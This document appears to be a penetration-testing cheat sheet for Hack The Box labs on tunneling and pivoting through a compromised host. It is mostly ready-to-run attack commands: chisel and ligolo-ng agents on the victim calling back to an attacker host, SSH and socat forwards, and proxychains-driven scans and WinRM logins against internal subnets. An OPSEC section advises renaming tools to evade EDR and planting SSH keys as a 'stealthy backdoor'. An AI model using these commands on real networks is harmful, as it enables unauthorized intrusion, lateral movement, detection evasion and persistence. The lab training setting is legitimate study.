# Tunneling Cheat Sheet

> Forward ports through a foothold so your tools see internal services
> directly. Mandatory for any pivot.

## When To Tunnel

- An internal service binds to `127.0.0.1` (e.g., OpenAdmin's
  `127.0.0.1:52846`).
- You compromise host A and want to scan / attack host B reachable
  only from A.
- You want a SOCKS proxy so all your tools (`nmap`, `crackmapexec`,
  `evil-winrm`) traverse the foothold.

## chisel — fastest, simplest

```bash
# 1) attacker
./chisel server -p 8000 --reverse

# 2) victim downloads chisel binary, then:
./chisel client <atk>:8000 R:1080:socks
# → SOCKS5 proxy now on attacker's 127.0.0.1:1080

# 3) attacker uses SOCKS via proxychains
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains.conf
proxychains nmap -sT -Pn -n --top-ports 50 10.10.20.0/24
proxychains evil-winrm -i 10.10.20.5 -u user -p pass
```

Specific port forward (instead of SOCKS):
```bash
./chisel client <atk>:8000 R:8080:127.0.0.1:80
# attacker can now hit http://localhost:8080 → victim:80
```

## SSH (when SSH is open from victim outbound)

```bash
# Local port forward — make a remote service appear on attacker
ssh -L 8080:127.0.0.1:80 user@<victim>     # attacker:8080 → victim:80

# Remote port forward — make an attacker service appear on victim
ssh -R 4444:127.0.0.1:4444 user@<victim>   # victim:4444 → attacker:4444

# Dynamic SOCKS — generic pivot
ssh -D 1080 user@<victim>                  # SOCKS5 on attacker's 1080

# Background, no-shell
ssh -fN -D 1080 user@<victim>
```

## socat — when SSH unavailable

```bash
# attacker
socat TCP-LISTEN:8000,reuseaddr,fork TCP:127.0.0.1:80
# victim (forward to attacker:8000 -> internal service)
socat TCP-LISTEN:8080,reuseaddr,fork TCP:internal:8080
```

## ligolo-ng — modern alternative

```bash
# attacker (proxy)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# victim
./agent -connect <atk>:11601 -ignore-cert

# attacker — add route in proxy console
> session
> ifconfig
> start
# proxy now bridges traffic into the victim's network as if it's a router
```

## SSHuttle — quick pseudo-VPN (root needed)

```bash
sshuttle -r user@<victim> 10.10.20.0/24
# routes the subnet through SSH
```

## proxychains config

Edit `/etc/proxychains.conf` (or use `proxychains4 -f myconfig.conf`):

```
[ProxyList]
socks5 127.0.0.1 1080
# or
socks4 127.0.0.1 1080
```

Notes:
- Use `socks5` whenever possible; `socks4` doesn't carry hostnames.
- Tools forced to UDP (DNS) won't traverse SOCKS — use `proxychains
  --quiet` and pre-resolve hostnames.

## Port forwarding matrix

| Need | Tool | Command |
|---|---|---|
| Generic pivot, all protocols | chisel SOCKS | `chisel client X R:1080:socks` |
| One internal port, no install | SSH `-L` | `ssh -L localport:127.0.0.1:remoteport user@host` |
| Receive callback through firewall | SSH `-R` | `ssh -R 4444:127.0.0.1:4444 user@host` |
| L3 routing (modern) | ligolo-ng | (above) |
| One-shot port relay | socat | (above) |

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| chisel server bound to `localhost` only | Victim can't connect | `--host 0.0.0.0` (default) and check firewall |
| SOCKS configured but proxychains uses `socks4` | Hostnames don't resolve | Use `socks5` |
| Port already in use on attacker | "address already in use" | Pick a different port; `ss -tlnp` to find conflict |
| nmap over proxychains is slow | Long scans even on tiny ranges | Use `-sT -Pn -n` and small port lists |
| SSH `-D` user doesn't have shell | Fails after auth | Use `-N` to skip shell |
| ICMP / UDP through SOCKS | Doesn't work | SOCKS is TCP-only; use ligolo for L3 |

## Decision-Making Logic

```
need to reach an internal service
  └─ have SSH from foothold? → use SSH -L / -D
  └─ no SSH? → can run a binary on victim?
       └─ chisel (simplest, fast)
       └─ ligolo-ng (modern, more capable)
       └─ socat (one-port relay)
```

## OPSEC

- chisel and ligolo are signatured by some EDRs; rename binaries.
- Long-running tunnels = persistence; consider RoE.
- SSH reverse port forwards + `~/.ssh/authorized_keys` from attacker
  side = stealthy backdoor.

## Real HTB Examples

- **OpenAdmin** — internal-only `127.0.0.1:52846` reached either via
  `curl` on the box or via SSH `-L` once `joanna` SSH's in.
- **Reel, Sniper, Multimaster, Carrier** — chisel / ssh-D pivots.
- **Conceal** — IPSec tunnel needed (rare; see machine-specific notes).
- **Mango, Sniper** — SSH `-L` / `-D` pivots after foothold.

## Related Skills

- [`pivoting/sock-proxies.md`](../pivoting/sock-proxies.md)
- [`pivoting/internal-port-scanning.md`](../pivoting/internal-port-scanning.md)
- [`tool-usage/chisel.md`](../tool-usage/chisel.md)
- [`methodology/10-lateral-movement.md`](../methodology/10-lateral-movement.md)
- [`methodology/13-post-exploitation.md`](../methodology/13-post-exploitation.md)
